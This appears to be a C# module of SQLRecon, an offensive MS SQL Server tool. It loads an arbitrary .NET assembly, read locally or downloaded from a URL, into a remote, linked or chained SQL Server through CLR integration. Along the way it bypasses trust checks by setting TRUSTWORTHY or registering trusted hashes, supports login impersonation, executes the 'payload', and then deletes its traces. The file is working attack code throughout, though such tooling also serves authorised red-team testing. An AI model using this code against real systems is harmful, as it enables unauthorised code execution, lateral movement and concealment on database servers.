using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using SQLRecon.Commands;
using SQLRecon.Utilities;

namespace SQLRecon.Modules
{
    internal abstract class Clr
    {
        /// <summary>
        /// The StandardOrImpersonation method loads and executes a custom .NET assembly 
        /// on a remote SQL server instance. Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="dll"></param>
        /// <param name="function"></param>
        /// <param name="impersonate"></param>
        internal static void StandardOrImpersonation(SqlConnection con, string dll, string function, string impersonate = null)
        {
            // Get the SHA-512 hash for the DLL and convert the DLL to bytes
            string[] dllArr = _convertDLLToSQLBytes(dll);
            string dllHash = dllArr[0];
            string dllBytes = dllArr[1];
            
            // Generate a new random string for the trusted hash path and the assembly name.
            string dllPath = RandomStr.Generate(8);
            string assem = RandomStr.Generate(8);
            
            // The queries dictionary contains all queries used by this module
            Dictionary<string, string> queries = new Dictionary<string, string>
            {
                { "sql_version", Query.GetSqlVersionNumber },
                { "database_trust_on", string.Format(Query.AlterDatabaseTrustOn, Var.Database) },
                { "database_trust_off", string.Format(Query.AlterDatabaseTrustOff, Var.Database) },
                { "check_clr_hash", string.Format(Query.CheckClrHash, dllHash) },
                { "drop_clr_hash",  string.Format(Query.DropClrHash, dllHash) },
                { "add_clr_hash", string.Format(Query.AddClrHash, dllHash, dllPath) },
                { "list_trusted_assemblies", Query.GetTrustedAssemblies },
                { "drop_procedure",  string.Format(Query.DropProcedure, function) },
                { "drop_assembly", string.Format(Query.DropClrAssembly, assem) },
                { "create_assembly", string.Format(Query.CreateAssembly, assem, dllBytes) },
                { "list_assembly", string.Format(Query.GetAssembly, assem) },
                { "list_stored_procedures",  Query.GetStoredProcedures },
                { "execute_clr_payload", string.Format(Query.ExecutePayload, function) }
            };
            
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            if (!string.IsNullOrEmpty(impersonate))
            {
                queries = Format.ImpersonationDictionary(impersonate, queries);
            }
            
            // These queries do not need to have the impersonation login prepended in front of them.
            queries.Add("login", string.Format(Query.ImpersonationLogin, impersonate) );
            queries.Add("load_dll_into_stored_procedure", string.Format(Query.LoadDllIntoStoredProcedure, function, assem) );

            // If /debug is provided, only print the queries then gracefully exit the program.
            if (Print.DebugQueries(queries))
            {
                // Go no further
                return;
            }  
            
            // First check to see if clr integration is enabled. 
            // Impersonation is supported.
            bool status = (string.IsNullOrEmpty(impersonate))
                ? Config.ModuleStatus(con, "clr enabled")
                : Config.ModuleStatus(con, "clr enabled", impersonate);
            
            if (status == false)
            {
                Print.Error("You need to enable CLR (enableclr).", true);
                // Go no further.
                return;
            }
            
            if (dllHash.Length != 128)
            {
                Print.Error("Unable to calculate hash for DLL.", true);
                // Go no further.
                return;
            }
            
            /*
             * First identify the version of SQL server.
             *
             * SQL server versions 2016 and below require altering the database
             * to "SET TRUSTWORTHY ON". 
             * 
             * SQL server versions 2016 and below (< 13.0.X) do not require
             * adding the SHA-512 hash of a CLR assembly into sys.trusted_assemblies.
             *
             */
            
            List<string> sqlVersion = Print.ExtractColumnValues(Sql.CustomQuery(con, queries["sql_version"]), "column0");
            int version = Int32.Parse(sqlVersion[0].Split('.')[0]);
            string sqlOutput;

            if (version <= 13)
            {
                Print.Status($"Legacy version of SQL Server detected: {sqlVersion[0]}", true);
                Print.Status($"Turning on the trustworthy property on '{Var.Database}'.", true);
                Sql.Query(con, queries["database_trust_on"]);
            }
            else
            {
                // Check if the hash already exists.
                sqlOutput = Sql.CustomQuery(con, queries["check_clr_hash"]);
            
                if (sqlOutput.ToLower().Contains("permission was denied"))
                {
                    Print.Error($"You do not have the correct privileges to perform this action.", true);
                    // Go no further.
                    return;
                }
            
                if (sqlOutput.Contains("System.Byte[]"))
                {
                    Print.Status("Hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                    sqlOutput = Sql.Query(con, queries["drop_clr_hash"]);
                }
            
                if (sqlOutput.ToLower().Contains("permission was denied"))
                {
                    Print.Error($"You do not have the correct privileges to perform this action.", true);
                    // Go no further.
                    return;
                }

                // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
                Sql.Query(con, queries["add_clr_hash"]);
           
                // Verify that the SHA-512 hash has been added.
                sqlOutput = Sql.CustomQuery(con, queries["list_trusted_assemblies"]);

                if (sqlOutput.Contains(dllPath))
                {
                    Print.Success($"Added SHA-512 hash for '{dll}' as a trusted assembly with a random name of '{dllPath}'.", true);
                }
                else
                {
                    Print.Error("Unable to add hash to sys.trusted_assemblies.", true);
                    // Go no further.
                    return;
                }
            }
            
            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            Sql.Query(con, queries["drop_procedure"]);
            Sql.Query(con, queries["drop_assembly"]);

            // Create a new custom assembly with the randomly generated name.
            Sql.Query(con, queries["create_assembly"]);

            // Check to see if the custom assembly has been created
            sqlOutput = Sql.Query(con, queries["list_assembly"]);

            if (sqlOutput.Contains(assem))
            {
                Print.Success($"Loaded DLL into a new custom assembly called '{assem}'.", true);
            }
            else
            {
                Print.Error("Unable to create a new assembly. Cleaning up.", true);
                Sql.Query(con, queries["drop_clr_hash"]);
                Sql.Query(con, queries["drop_assembly"]);
                // Go no further.
                return;
            }
            
            /*
             * Create a stored procedure based on the function name in the DLL.
             * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
             * as this will execute the query as a block. In MS SQL manager, this command
             * will need to be executed with a GO before it, and a GO after it a
             * 'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
             */
            if (string.IsNullOrEmpty(impersonate))
            {
                try
                {
                    SqlCommand query = new(queries["load_dll_into_stored_procedure"], con);

                    query.ExecuteNonQuery();
                }
                catch (Exception e)
                {
                    Print.Error($"{e}", true);
                }
            }
            else
            {
                try
                {
                    SqlCommand query = new(queries["login"], con);

                    query.ExecuteNonQuery();

                    query = new(queries["load_dll_into_stored_procedure"], con);
                
                    query.ExecuteNonQuery();
                }
                catch (Exception e)
                {
                    Print.Error($"{e}", true);
                }
            }
            
            sqlOutput = Sql.CustomQuery(con, queries["list_stored_procedures"]);

            if (sqlOutput.Contains(function))
            {
                Print.Success($"Added the '{assem}' assembly into a new stored procedure called '{function}'.", true);
            }
            else
            {
                Print.Error("Unable to load the DLL into a new stored procedure. Cleaning up.", true);
                Sql.Query(con, queries["drop_procedure"]);
                Sql.Query(con, queries["drop_assembly"]);
                Sql.Query(con, queries["drop_clr_hash"]);
                // Go no further.
                return;
            }

            // Executing new custom assembly and stored procedure.
            Print.Status("Executing payload ...", true);
            Sql.Query(con, queries["execute_clr_payload"]);

            // Cleaning up.
            Print.Status($"Cleaning up. Deleting assembly '{assem}', stored procedure '{function}' and trusted assembly hash '{dllPath}'.", true);
            Sql.Query(con, queries["drop_procedure"]);
            Sql.Query(con, queries["drop_assembly"]);
            Sql.Query(con, queries["drop_clr_hash"]);
            
            // Ensure that the database trustworthy property is reverted.
            if (version <= 13)
            {
                Print.Status($"Turning off the trustworthy property on '{Var.Database}'.", true);
                Sql.Query(con, queries["database_trust_off"]);
            }
        }
        
        /// <summary>
        /// The LinkedOrChain method loads and executes a custom .NET assembly on a remote linked SQL server instance.
        /// Execution against the last SQL server specified in a chain of linked SQL servers is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="dll"></param>
        /// <param name="function"></param>
        /// <param name="linkedSqlServer"></param>
        /// <param name="sqlServer"></param>
        /// <param name="linkedSqlServerChain"></param>
        internal static void LinkedOrChain(SqlConnection con, string dll, string function, string linkedSqlServer, string sqlServer, string[] linkedSqlServerChain = null)
        {
            // Get the SHA-512 hash for the DLL and convert the DLL to bytes
            string[] dllArr = _convertDLLToSQLBytes(dll);
            string dllHash = dllArr[0];
            string dllBytes = dllArr[1];
            
            // Generate a new random string for the trusted hash path and the assembly name.
            string dllPath = RandomStr.Generate(8);
            string assem = RandomStr.Generate(8);
            
            // The queries dictionary contains all queries used by this module
            Dictionary<string, string> queries = new Dictionary<string, string>
            {
                { "sql_version", Query.GetSqlVersionNumber },
                { "rpc_database_trust_on", string.Format(Query.AlterDatabaseTrustOn, Var.Database) },
                { "rpc_database_trust_off", string.Format(Query.AlterDatabaseTrustOff, Var.Database) },
                { "check_clr_hash", string.Format(Query.CheckClrHash, dllHash) },
                { "rpc_drop_clr_hash",  string.Format(Query.DropClrHash, dllHash) },
                { "rpc_add_clr_hash", string.Format(Query.AddClrHash, dllHash, dllPath) },
                { "list_trusted_assemblies", Query.GetTrustedAssemblies },
                { "rpc_drop_procedure",  string.Format(Query.DropProcedure, function) },
                { "rpc_drop_assembly", string.Format(Query.DropClrAssembly, assem) },  
                { "rpc_load_dll_into_stored_procedure", string.Format(Query.LoadDllIntoStoredProcedure, function, assem) },
                { "rpc_create_assembly", string.Format(Query.CreateAssembly, assem, dllBytes) },
                { "list_assembly", string.Format(Query.GetAssembly, assem) },
                { "list_stored_procedures",  Query.GetStoredProcedures },
                { "rpc_execute_clr_payload",  string.Format(Query.ExecutePayload, function) }
            };
            
            queries = (linkedSqlServerChain == null) 
                // Format all queries so that they are compatible for execution on a linked SQL server.
                ? Format.LinkedDictionary(linkedSqlServer, queries)
                // Format all queries so that they are compatible for execution on the last SQL server specified in a linked chain.
                : Format.LinkedChainDictionary(linkedSqlServerChain, queries);
            
            // If /debug is provided, only print the queries then gracefully exit the program.
            if (Print.DebugQueries(queries))
            {
                // Go no further
                return;
            } 
            
            // First check to see if rpc is enabled.
            if (Config.ModuleStatus(con, "rpc", null, linkedSqlServer) == false)
            {
                Print.Error(
                    $"You need to enable RPC for {linkedSqlServer} on {sqlServer} (enablerpc /rhost:{linkedSqlServer}).", true);
                // Go no further.
                return;
            }

            // Then check to see if clr integration is enabled.
            if (Config.LinkedModuleStatus(con, "clr enabled", linkedSqlServer, linkedSqlServerChain) == false)
            {
                Print.Error("You need to enable CLR (enableclr).", true);
                // Go no further.
                return;
            }
           
            if (dllHash.Length != 128)
            {
                Print.Error("Unable to calculate hash for DLL.", true);
                // Go no further.
                return;
            }
            
            /*
             * First identify the version of SQL server.
             *
             * SQL server versions 2016 and below require altering the database
             * to "SET TRUSTWORTHY ON".
             *
             * SQL server versions 2016 and below (< 13.0.X) do not require
             * adding the SHA-512 hash of a CLR assembly into sys.trusted_assemblies.
             *
             */
            
            List<string> sqlVersion = Print.ExtractColumnValues(Sql.CustomQuery(con, queries["sql_version"]), "column0");
            int version = Int32.Parse(sqlVersion[0].Split('.')[0]);
            string sqlOutput;

            if (version <= 13)
            {
                Print.Status($"Legacy version of SQL Server detected: {sqlVersion[0]}", true);
                Print.Status($"Turning on the trustworthy property on '{Var.Database}'.", true);
                Sql.Query(con, queries["rpc_database_trust_on"]);
            }
            else
            {
                // Check to see if the hash already exists.
                sqlOutput = Sql.CustomQuery(con, queries["check_clr_hash"]);

                if (sqlOutput.ToLower().Contains("permission was denied"))
                {
                    Print.Error($"You do not have the correct privileges to perform this action.", true);
                    // Go no further.
                    return;
                }
            
                if (sqlOutput.Contains("System.Byte[]"))
                {
                    Print.Success($"Added SHA-512 hash for '{dll}' as a trusted assembly with a random name of '{dllPath}'.", true);
                    sqlOutput = Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
                }
            
                if (sqlOutput.ToLower().Contains("permission was denied"))
                {
                    Print.Error($"You do not have the correct privileges to perform this action.", true);
                    // Go no further.
                    return;
                }

                // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
                Sql.CustomQuery(con, queries["rpc_add_clr_hash"]);
            
                // Verify that the SHA-512 hash has been added.
                sqlOutput = Sql.CustomQuery(con, queries["list_trusted_assemblies"]);
            
                if (sqlOutput.Contains(dllPath))
                {
                    Print.Success(
                        $"Added SHA-512 hash for '{dll}' as a trusted assembly with a random name of '{dllPath}'.", true);
                }
                else
                {
                    Print.Error("Unable to add hash to sys.trusted_assemblies.", true);
                    // Go no further.
                    return;
                }
            }
            
            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
            Sql.CustomQuery(con, queries["rpc_drop_assembly"]);

            // Create a new custom assembly with the randomly generated name.
            Sql.CustomQuery(con, queries["rpc_create_assembly"]);
            
            // Check to see if the custom assembly has been created
            sqlOutput = Sql.CustomQuery(con, queries["list_assembly"]);
            
            if (sqlOutput.Contains(assem))
            {
                Print.Success($"Loaded DLL into a new custom assembly called '{assem}'.", true);
            }
            else
            {
                Print.Error("Unable to create a new assembly. Cleaning up.", true);
                Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
                Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
                // Go no further.
                return;
            }

            /*
             * Create a stored procedure based on the function name in the DLL.
             * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
             * as this will execute the query as a block. In MS SQL manager, this command
             * will need to be executed with a GO before it, and a GO after it a
             * 'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
             */
            
            try
            {
                SqlCommand query = new(queries["rpc_load_dll_into_stored_procedure"], con);
                
                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                Print.Error($"{e}", true);
            }

            sqlOutput = Sql.CustomQuery(con, queries["list_stored_procedures"]);
            
            if (sqlOutput.Contains(function))
            {
                Print.Success($"Added the '{assem}' assembly into a new stored procedure called '{function}'.", true);
            }
            else
            {
                Print.Error("Unable to load the DLL into a new stored procedure. Cleaning up.", true);
                Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
                Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
                Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
                
                // Go no further.
                return;
            }

            // Executing new custom assembly and stored procedure.
            Print.Status("Executing payload ...", true);
            Sql.CustomQuery(con, queries["rpc_execute_clr_payload"]);

            // Cleaning up.
            Print.Status($"Cleaning up. Deleting assembly '{assem}', stored procedure '{function}' and trusted assembly hash '{dllPath}'.", true);
            Sql.CustomQuery(con, queries["rpc_drop_procedure"]);
            Sql.CustomQuery(con, queries["rpc_drop_assembly"]);
            Sql.CustomQuery(con, queries["rpc_drop_clr_hash"]);
            
            // Ensure that the database trustworthy property is reverted.
            if (version <= 13)
            {
                Print.Status($"Turning off the trustworthy property on '{Var.Database}'.", true);
                Sql.Query(con, queries["rpc_database_trust_off"]);
            }
        }
        
        /// <summary>
        /// The _convertDLLToSQLBytesFile method will take a .NET assembly on disk and covert it
        /// to SQL compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] _convertDLLToSQLBytesFile(string dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            // Read the DLL, create an SHA-512 hash for it and convert the DLL to SQL compatible bytes.
            try
            {
                FileInfo fileInfo = new FileInfo(dll);
                Print.Status($"{dll} is {fileInfo.Length} bytes.", true);

                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
                using (SHA512 sha512 = SHA512.Create())
                {
                    using (FileStream fileStream = File.OpenRead(dll))
                    {
                        foreach (byte hash in sha512.ComputeHash(fileStream))
                        {
                            dllHash += hash.ToString("x2");
                        }
                    }
                }

                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
                foreach (Byte b in File.ReadAllBytes(dll))
                {
                    dllBytes += b.ToString("X2");
                }

            }
            catch (FileNotFoundException)
            {
                Print.Error($"Unable to load {dll}", true);
            }

            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        /// <summary>
        /// The _convertDLLToSQLByteWeb method will download a .NET assembly from a remote HTTP/s
        /// location and covert it to SQL compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] _convertDLLToSQLBytesWeb(string dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            try
            {
                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
                using SHA512 sha512 = SHA512.Create();
                using WebClient client = new WebClient();
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                Print.Status($"Downloading DLL from {dll}", true);

                byte[] content = client.DownloadData(dll);

                using MemoryStream stream = new MemoryStream(content);
                BinaryReader reader = new BinaryReader(stream);
                byte[] dllByteArray = reader.ReadBytes(Convert.ToInt32(stream.Length));
                stream.Close();
                reader.Close();

                Print.Status($"DLL is {dllByteArray.Length} bytes, this will take a minute ...", true);

                foreach (var hash in sha512.ComputeHash(dllByteArray))
                {
                    dllHash += hash.ToString("x2");
                }
                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
                foreach (Byte b in dllByteArray)
                {
                    dllBytes += b.ToString("X2");
                }
            }
            catch (Exception ex)
            {
                Print.Error($"Unable to download DLL from {ex}", true);
            }

            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        /// <summary>
        /// The _convertDLLToSQLBytes method determines if the .NET assembly resides locally
        /// on disk, or remotely on a web server.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] _convertDLLToSQLBytes(string dll)
        {
            string[] dllArr = new string[2];

            // Logic to determine if the DLL is being read from disk or web.
            dllArr = (dll.ToLower().Contains("http://") || dll.ToLower().Contains("https://"))
            ? _convertDLLToSQLBytesWeb(dll)
            : _convertDLLToSQLBytesFile(dll);

            return dllArr;
        }
    }
}